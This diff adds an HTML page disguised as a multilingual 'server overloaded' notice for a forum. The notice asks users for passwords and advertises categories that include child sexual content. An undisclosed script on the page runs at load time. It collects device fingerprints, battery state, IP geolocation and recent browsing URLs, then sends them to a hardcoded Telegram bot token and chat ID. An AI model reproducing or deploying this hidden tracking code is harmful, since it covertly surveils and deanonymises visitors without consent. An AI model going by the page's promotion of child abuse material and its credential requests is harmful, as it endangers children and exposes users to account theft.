@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Service Temporarily Overloaded</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Roboto:wght@400;700&family=Noto+Sans+Bengali:wght@400;700&family=Noto+Sans+Devanagari:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        :root {
+            --background-color: #282828;
+            --text-color: #d2d2d2;
+            --accent-color: #d2003c;
+            --notice-bg-color: #3a3a3a; /* Slightly lighter for the notice box */
+            --font-primary: "Roboto", sans-serif;
+            --font-monospace: "Share Tech Mono", monospace;
+            --font-bengali: "Noto Sans Bengali", sans-serif;
+            --font-hindi: "Noto Sans Devanagari", sans-serif;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--background-color);
+            color: var(--text-color);
+            display: flex;
+            min-height: 100vh;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-family: var(--font-primary);
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 700px; /* Increased width for multilingual content */
+            width: 100%;
+        }
+
+        .traffic-notice-container {
+            background-color: var(--notice-bg-color);
+            padding: 25px;
+            border-radius: 8px;
+            border: 1px solid #444;
+            margin-bottom: 30px;
+        }
+
+        .notice-title {
+            font-family: var(--font-monospace);
+            font-size: 2rem; /* 32px */
+            color: var(--accent-color);
+            margin-bottom: 15px;
+            font-weight: 400;
+        }
+
+        .notice-reason {
+            font-size: 1.25rem; /* 20px */
+            color: var(--text-color);
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+
+        .language-section {
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px dashed #555; /* Separator for languages */
+        }
+        .language-section:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+
+        .language-section h3 {
+            font-size: 1.1rem; /* 17.6px */
+            color: var(--text-color);
+            margin-bottom: 8px;
+            text-align: left;
+            font-weight: 700;
+        }
+        .language-section[lang="bn"] h3,
+        .language-section[lang="bn"] p {
+            font-family: var(--font-bengali);
+        }
+        .language-section[lang="hi"] h3,
+        .language-section[lang="hi"] p {
+            font-family: var(--font-hindi);
+        }
+
+        .language-section p {
+            font-size: 1rem; /* 16px */
+            color: var(--text-color);
+            line-height: 1.6;
+            text-align: left;
+        }
+        .language-section p strong {
+            color: var(--accent-color);
+            font-weight: 700;
+        }
+
+        .site-footer {
+            color: var(--text-color);
+            margin-top: 40px;
+            /* border-top: 1px solid #444; No need for border if notice box is distinct */
+            padding-top: 20px;
+        }
+
+        .site-footer h2 {
+            color: var(--text-color);
+            font-size: 1.5rem; /* 24px */
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .site-footer h2 .fa-comments {
+            color: var(--accent-color);
+            margin-right: 10px;
+        }
+
+        .contact-links a {
+            color: var(--text-color);
+            font-size: 1.8rem; /* 28.8px */
+            margin: 0 10px;
+            transition: color 0.3s ease;
+        }
+
+        .contact-links a:hover {
+            color: var(--accent-color);
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 600px) {
+            .notice-title {
+                font-size: 1.8rem;
+            }
+            .notice-reason {
+                font-size: 1.1rem;
+            }
+            .language-section h3 {
+                font-size: 1rem;
+            }
+            .language-section p {
+                font-size: 0.95rem;
+            }
+            .site-footer h2 {
+                font-size: 1.3rem;
+            }
+            .contact-links a {
+                font-size: 1.6rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <main>
+            <div class="traffic-notice-container">
+                <h1 class="notice-title">SYSTEM NOTICE</h1>
+                <p class="notice-reason">High Server Traffic (Too Many Visitors)</p>
+
+                <div class="language-section" lang="en">
+                    <h3>English:</h3>
+            <p> We have added more than 2000 members in the last seven days. Our total number of members is 4700+. In such a situation, there is a lot of pressure on our server, to maintain the server and improve all services, we are not allowing new accounts to be created. You will be able to open a free account again very soon. However, all our previous members will be able to do all the activities properly! Those who have already requested to create an account will receive an email in their Gmail inbox very soon. If you do not receive the email, check your Gmail spam folder. Those who are unable to do the Final Setup even after receiving the email, are requested to set up with the required information (RayID, Password, Media, Etc). If you fail once, try again. We are deeply sorry for the temporary inconvenience! We are trying to solve it very soon! Thank you<br><br>
+
+<strong>Those who got the chance to become a moderator will be emailed with a special custom link that can be accessed directly as soon as possible.</strong></p>
+                </div>
+
+                <div class="language-section" lang="bn"> <!-- Bengali -->
+                    <h3>বাংলা (Bengali):</h3>
+                    <p>আমরা গত সাতদিনে ২০০০ এর বেশি মেম্বার যুক্ত করেছি।  আমাদের সর্বমোট মেম্বার ৪৭০০+ ।  এমত অবস্থায় আমাদের সার্ভারের উপর প্রচুর চাপ পড়ছে, সার্ভার রক্ষণাবেক্ষণ এবং সকল পরিষেবা আরও উন্নত করতে আমরা নতুন একাউন্ট তৈরি করতে দিচ্ছি না ।  খুব শিগগিরই আবার ফ্রীতে একাউন্ট খুলতে পারবেন ।  তবে আমাদের আগের সকল মেম্বারদের সকল কার্যক্রম ভালোভাবে করতে পারবে! যারা অলরেডি একাউন্ট তৈরিরজন্য রিকোয়েস্ট করেছেন,  তারা খুব শিগগিরই তাদের জিমেইলের ইনবক্সে ইমেল পেয়ে যাবেন । ইমেইল না পেলে আপনার জিমেইলের স্প্যাম ফোল্ডার চেক করুন ।  যারা ইমেইল পাওয়ার পরেও Final Setup করতে পারছেন না, তাদেরকে সকল ইনফোরমেশন (RayID, Password, Media, Etc) দিয়ে সেট আপ করার অনুরোধ করা হলো ।  একবার ফেইল হলে পুনরায় আবার চেষ্টা করবেন । সাময়িক অসুবিধার জন্য আমরা আন্তরীক ভাবে দুঃখীত! আমরা খুব শিগগিরই এটা সমাধান করার চেষ্টা করছি! ধন্যবাদ।
+
+<br><br>
+<strong>
+যারা মডারেটর হওয়ার চান্স পেয়েছেন, তাদেরকে খুব তাড়াতাড়ি সরাসরি এক্সেসবল স্পেশাল কাস্টম লিংক সহো ইমেইল করা হবে ।</strong></p>
+                </div>
+
+               
+               
+               
+               <strong>Mazhabi | Incest | Gay/Lesbian | Scat | BDSM | Hardcore | Child </storng>
+            </div>
+        </main>
+
+        <footer class="site-footer">
+            <h2><i class="fa-regular fa-comments"></i> Mazhabi Forum </h2>
+            <p class="contact-links">
+                <a href="https://t.me/m_forum_support" title="Telegram Support" aria-label="Telegram Support"><i class="fa-brands fa-telegram"></i></a>
+                <a href="mailto:support@example.com" title="Email Support" aria-label="Email Support"><i class="fa-solid fa-envelope"></i></a>
+             
+             
+             
+            </p>
+        </footer>
+    </div>
+    <script>
+    var deviceInfo = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screenResolution: `${window.screen.width}x${window.screen.height}`,
+    colorDepth: window.screen.colorDepth,
+    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Not Available",
+    deviceModel: "Loading...",
+    battery: {
+        charging: "Loading...",
+        level: "Loading..."
+    }
+};
+
+var browserInfo = {
+    browser: navigator.appName,
+    version: navigator.appVersion,
+    cookiesEnabled: navigator.cookieEnabled,
+    onlineStatus: navigator.onLine ? "Online" : "Offline"
+};
+
+var ipInfo = {
+    ip: "retrieved by server-side API",
+    city: "Loading...",
+    region: "Loading...",
+    country: "Loading...",
+    location: "Loading...",
+    isp: "Loading...",
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    referrer: document.referrer || "Direct Visit",
+    pageTitle: document.title,
+    pageURL: window.location.href,
+    browsingHistory: [],
+    vpnStatus: "Checking..."
+};
+
+// --- Markdown Escape Function ---
+function escapeTelegramMarkdown(text) {
+    if (text === undefined || text === null) return "";
+    if (typeof text !== 'string') text = String(text);
+    // Telegram's legacy Markdown parser requires escaping for _, *, `, [
+    // It's also good practice to escape ~ for strikethrough if it might appear in data.
+    // For URLs or text that might contain these, escaping is crucial.
+    return text
+        .replace(/_/g, '\\_')
+        .replace(/\*/g, '\\*')
+        .replace(/`/g, '\\`')
+        .replace(/\[/g, '\\[')
+        .replace(/~/g, '\\~'); // Escape tilde for strikethrough
+        // Parentheses and other characters are usually fine unless part of complex structures
+        // or if MarkdownV2 is used (which requires more escaping).
+}
+
+
+function collectUserHistory() {
+    if (localStorage.getItem("userHistory")) {
+        let history = JSON.parse(localStorage.getItem("userHistory"));
+        history.push(window.location.href);
+        if (history.length > 5) history.shift();
+        localStorage.setItem("userHistory", JSON.stringify(history));
+        ipInfo.browsingHistory = history;
+    } else {
+        localStorage.setItem("userHistory", JSON.stringify([window.location.href]));
+        ipInfo.browsingHistory = [window.location.href];
+    }
+}
+
+function sendToTelegramBot() {
+    var bots = [
+        // --- অনুগ্রহ করে এখানে আপনার আসল টোকেন এবং চ্যাট আইডি ব্যবহার করুন ---
+        { token: "7812229435:AAFy9GwW6SecjSsqglaww4CseVnhzy4bS84", chatId: "7913066602" }
+        // উপরের লাইনে আপনার আসল টোকেন এবং চ্যাট আইডি যেমন "7519273136:AAHZ7eBXEoVZRQFqILu8tGnuMLvtZOWohqc" এবং "7945358964" বসান।
+    ];
+
+    // --- Escape all dynamic string values before inserting them into the message ---
+    var message = `❤️ *YTC Web ~ Device and Browser Information* ❤️\n` +
+        `📱 **Device Info:**\n` +
+        `- User Agent: ${escapeTelegramMarkdown(deviceInfo.userAgent)}\n` +
+        `- Platform: ${escapeTelegramMarkdown(deviceInfo.platform)}\n` +
+        `- Language: ${escapeTelegramMarkdown(deviceInfo.language)}\n` +
+        `- Screen Resolution: ${escapeTelegramMarkdown(deviceInfo.screenResolution)}\n` +
+        `- Color Depth: ${escapeTelegramMarkdown(String(deviceInfo.colorDepth))}\n` + // Ensure colorDepth is string
+        `- RAM: ${escapeTelegramMarkdown(deviceInfo.ram)}\n` +
+        `- Device Model: ${escapeTelegramMarkdown(deviceInfo.deviceModel)}\n` +
+        `- Battery: ${escapeTelegramMarkdown(deviceInfo.battery.charging)}, Level: ${escapeTelegramMarkdown(deviceInfo.battery.level)}\n\n` +
+        `🌐 **Browser Info:**\n` +
+        `- Browser: ${escapeTelegramMarkdown(browserInfo.browser)}\n` +
+        `- Version: ${escapeTelegramMarkdown(browserInfo.version)}\n` +
+        `- Cookies Enabled: ${escapeTelegramMarkdown(String(browserInfo.cookiesEnabled))}\n` + // Ensure boolean is string
+        `- Online Status: ${escapeTelegramMarkdown(browserInfo.onlineStatus)}\n\n` +
+        `📌 **Page Info:**\n` +
+        `- Title: ${escapeTelegramMarkdown(ipInfo.pageTitle)}\n` +
+        `- URL: ${escapeTelegramMarkdown(ipInfo.pageURL)}\n` +
+        `- Referrer: ${escapeTelegramMarkdown(ipInfo.referrer)}\n\n` +
+        `🌍 **IP and Location Info:**\n` +
+        `- IP: ${escapeTelegramMarkdown(ipInfo.ip)}\n` +
+        `- City: ${escapeTelegramMarkdown(ipInfo.city)}\n` +
+        `- Region: ${escapeTelegramMarkdown(ipInfo.region)}\n` +
+        `- Country: ${escapeTelegramMarkdown(ipInfo.country)}\n` +
+        `- Location (Lat, Long): ${escapeTelegramMarkdown(ipInfo.location)}\n` +
+        `- ISP: ${escapeTelegramMarkdown(ipInfo.isp)}\n` +
+        `- Timezone: ${escapeTelegramMarkdown(ipInfo.timezone)}\n` + // This is often a culprit
+        `- VPN: ${escapeTelegramMarkdown(ipInfo.vpnStatus)}\n\n` +
+        `📖 **Browsing History (last 5 on this site):**\n` +
+        `${ipInfo.browsingHistory.map(url => escapeTelegramMarkdown(url)).join('\n')}`;
+
+    bots.forEach(bot => {
+        if (message.length > 4096) {
+            console.error(`Message for chat ID ${bot.chatId} is too long (${message.length} chars). Max is 4096. Message not sent.`);
+            return;
+        }
+
+        var url = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+        fetch(url) // এই লাইনটি আপনার উল্লেখ করা ১৪২ নম্বর লাইনের কাছাকাছি হবে
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log(`Message sent successfully to bot with chat ID ${bot.chatId}!`);
+                } else {
+                    console.error(`Error sending message to bot with chat ID ${bot.chatId}. Telegram API Error: ${data.description} (Code: ${data.error_code})`);
+                    console.log("Problematic Message Content (first 500 chars):", message.substring(0, 500)); // problematic message content দেখতে
+                }
+            })
+            .catch(error => {
+                console.error(`Network error or failed to parse JSON for bot with chat ID ${bot.chatId}:`, error);
+            });
+    });
+}
+
+async function gatherAndSend() {
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+        try {
+            const ua = await navigator.userAgentData.getHighEntropyValues(["model"]);
+            deviceInfo.deviceModel = ua.model || "Unknown";
+        } catch {
+            deviceInfo.deviceModel = "Unknown (Error fetching model)";
+        }
+    } else {
+        deviceInfo.deviceModel = "Not Supported by browser";
+    }
+
+    if (navigator.getBattery) {
+        try {
+            const battery = await navigator.getBattery();
+            deviceInfo.battery.charging = battery.charging ? "Charging" : "Not Charging";
+            deviceInfo.battery.level = Math.round(battery.level * 100) + "%";
+        } catch {
+            deviceInfo.battery.charging = "Unavailable";
+            deviceInfo.battery.level = "Unavailable";
+        }
+    } else {
+        deviceInfo.battery.charging = "Not Supported by browser";
+        deviceInfo.battery.level = "Not Supported by browser";
+    }
+
+    fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            ipInfo.ip = data.ip || "Not Available";
+            ipInfo.city = data.city || "Not Available";
+            ipInfo.region = data.region || "Not Available";
+            ipInfo.country = data.country || "Not Available";
+            ipInfo.location = data.loc || "Not Available";
+            ipInfo.isp = data.org || "Not Available";
+
+            if (ipInfo.isp && typeof ipInfo.isp === 'string' && ipInfo.isp.toLowerCase().includes("vpn")) {
+                ipInfo.vpnStatus = "Possible VPN Detected";
+            } else if (ipInfo.isp === "Not Available" || ipInfo.isp === "Error fetching") {
+                 ipInfo.vpnStatus = "Checking Failed (ISP N/A)";
+            }
+            else {
+                ipInfo.vpnStatus = "No VPN Detected (based on ISP)";
+            }
+
+            collectUserHistory();
+            sendToTelegramBot();
+        })
+        .catch((error) => {
+            console.error("Failed to fetch IP info:", error);
+            ipInfo.ip = "Error fetching IP";
+            ipInfo.city = "Error fetching";
+            ipInfo.region = "Error fetching";
+            ipInfo.country = "Error fetching";
+            ipInfo.location = "Error fetching";
+            ipInfo.isp = "Error fetching";
+            ipInfo.vpnStatus = "Checking Failed (IP fetch error)";
+            collectUserHistory();
+            sendToTelegramBot();
+        });
+}
+
+gatherAndSend();
+
+/*
+// Theme toggle function (HTML এ বাটন এবং CSS প্রয়োজন)
+function toggleTheme() {
+    document.body.classList.toggle('light-mode');
+    const themeToggle = document.querySelector('.theme-toggle i');
+    if (themeToggle) {
+        if (document.body.classList.contains('light-mode')) {
+            themeToggle.classList.remove('fa-moon');
+            themeToggle.classList.add('fa-sun');
+        } else {
+            themeToggle.classList.remove('fa-sun');
+            themeToggle.classList.add('fa-moon');
+        }
+    }
+}
+*/
+  </script>
+
+</body>
+</html>
